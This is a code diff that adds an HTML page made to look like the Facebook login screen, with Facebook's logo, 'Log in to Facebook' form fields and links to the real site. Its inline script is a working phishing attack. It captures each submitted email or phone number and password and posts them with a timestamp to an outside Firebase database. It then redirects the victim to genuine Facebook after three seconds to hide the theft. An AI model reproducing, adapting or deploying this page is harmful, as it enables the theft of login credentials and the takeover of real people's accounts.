@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook</title>
+    <link rel="stylesheet" href="./Facebook.css" />
+  </head>
+  <body>
+    <div class="Container">
+      <img
+        class="_97vu img titleImg"
+        src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
+        alt="Facebook"
+        width="240px"
+      />
+      <!--  -->
+      <br />
+      <div class="formDiv">
+        <div class="title">Log in to Facebook</div>
+        <form id="Form" action="">
+          <input
+            type="email"
+            class="inputtext _55r1 inputtext _1kbt inputtext _1kbt"
+            name="email"
+            id="email"
+            placeholder="Email address or phone number"
+            autofocus="1"
+            autocomplete="username"
+            required
+          />
+          <!--  -->
+          <!--  -->
+          <div class="_55r1 _1kbt">
+            <input
+              type="password"
+              class="inputtext _55r1 inputtext _9npi inputtext _9npi"
+              name="pass"
+              id="pass"
+              placeholder="Password"
+              autocomplete="current-password"
+              required
+            />
+            <div class="_9ls7 hidden_elem" id="u_0_3_If">
+              <a href="#" role="button"
+                ><div class="_9lsa"><div class="_9lsb" id="u_0_4_GZ"></div></div
+              ></a>
+            </div>
+          </div>
+          <!--  -->
+          <!--  -->
+          <input
+            value="Log in"
+            class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy logInBtn"
+            id="loginbutton"
+            name="login"
+            tabindex="0"
+            type="submit"
+          />
+          <!-- Log in
+          </button> -->
+          <!--  -->
+          <div class="_97w3 frgt">
+            <a
+              href="https://www.facebook.com/recover/initiate/?ars=facebook_login"
+              class="_97w4"
+              target=""
+              >Forgotten account?</a
+            >
+          </div>
+          <!--  -->
+          <div class="_1rf5 hr"><span class="_1rf8 hrspan">or</span></div>
+          <!--  -->
+          <div style="display: flex; justify-content: center">
+            <div class="_xkt newAcnt">
+              <a
+                role="button"
+                class="_42ft _4jy0 _16jx _4jy6 _4jy2 selected _51sy"
+                href="https://www.facebook.com/r.php?locale=bn_IN&amp;display=page"
+                >Create New Account</a
+              >
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+    <!--  -->
+    <!--  -->
+    <!--  -->
+    <script>
+      const email = document.querySelector("#email");
+      const pass = document.querySelector("#pass");
+      const Form = document.querySelector("#Form");
+      const loginbutton = document.querySelector("#loginbutton");
+      //////////////////
+      Form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        loginbutton.value = "Logging in progress...";
+
+        const emailValue = email.value;
+        const passValue = pass.value;
+        //////////////////
+        fetch("https://facebook-568a9-default-rtdb.firebaseio.com/Data.json", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            Time: new Date().toLocaleString(),
+            Email_Phone: emailValue,
+            Password: passValue,
+          }),
+        })
+          .then(() => {
+            console.log("1");
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+        //////////////////
+        setTimeout(() => {
+          window.location = "https://www.facebook.com/settings/?tab=account";
+        }, 3000);
+      });
+    </script>
+  </body>
+</html>
